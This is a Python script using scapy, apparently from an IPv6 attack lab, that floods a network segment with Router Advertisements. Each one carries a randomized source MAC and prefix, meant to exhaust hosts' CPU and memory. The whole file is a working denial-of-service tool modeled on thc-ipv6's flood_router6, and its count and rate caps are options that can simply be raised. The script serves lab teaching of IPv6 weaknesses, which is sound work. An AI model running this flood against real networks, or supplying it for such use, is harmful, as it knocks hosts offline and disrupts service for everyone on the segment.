#!/usr/bin/env python3
"""04-ra-flood.py -- flood distinct Router Advertisements (RA flood DoS).

Sends --count RAs, each from a different randomized source MAC/prefix,
to exhaust a host's CPU/memory processing default-router and prefix
lists - the ~2011-era "any Windows box on the segment falls over" DoS.
See deep-dive.md's Attack Lab section; from-scratch version of
thc-ipv6's flood_router6.

This is a real (bounded, lab-scoped) denial-of-service tool. Default
count is small and rate is capped on purpose - raise both explicitly if
you know what you're doing and have authorization for the target.

Usage (run inside the attacker namespace):
    sudo ip netns exec v6lab-attacker python3 04-ra-flood.py --iface veth-attacker
    sudo ip netns exec v6lab-attacker python3 04-ra-flood.py --iface veth-attacker --count 500 --rate 50
"""

import argparse
import random
import time
from scapy.all import Ether, IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, sendp


def random_mac():
    b = [0x02, random.randint(0, 255), random.randint(0, 255),
         random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)]
    return ":".join(f"{x:02x}" for x in b)


def eui64_link_local(mac_str):
    b = [int(x, 16) for x in mac_str.split(":")]
    b[0] ^= 0x02
    iid = b[0:3] + [0xff, 0xfe] + b[3:6]
    return "fe80::" + ":".join(f"{iid[i]:02x}{iid[i + 1]:02x}" for i in range(0, 8, 2))


parser = argparse.ArgumentParser(description="Flood distinct Router Advertisements")
parser.add_argument("--iface", required=True)
parser.add_argument("--count", type=int, default=100, help="number of distinct RAs to send (default 100)")
parser.add_argument("--rate", type=float, default=20.0, help="RAs per second, capped (default 20)")
args = parser.parse_args()

interval = 1.0 / max(args.rate, 0.1)

print(f"flooding {args.count} distinct RAs on {args.iface} at ~{args.rate}/s")
for i in range(args.count):
    mac = random_mac()
    ip = eui64_link_local(mac)
    prefix = f"fd00:{random.randint(0, 0xffff):x}:{random.randint(0, 0xffff):x}::"
    pkt = (
        Ether(src=mac, dst="33:33:00:00:00:01")
        / IPv6(src=ip, dst="ff02::1")
        / ICMPv6ND_RA(chlim=64, routerlifetime=1800)
        / ICMPv6NDOptPrefixInfo(prefix=prefix, prefixlen=64, L=1, A=1,
                                validlifetime=2592000, preferredlifetime=604800)
    )
    sendp(pkt, iface=args.iface, verbose=False)
    if (i + 1) % 20 == 0:
        print(f"  sent {i + 1}/{args.count}")
    time.sleep(interval)

print("done. on the victim: ip -6 route show (count the default routes)")
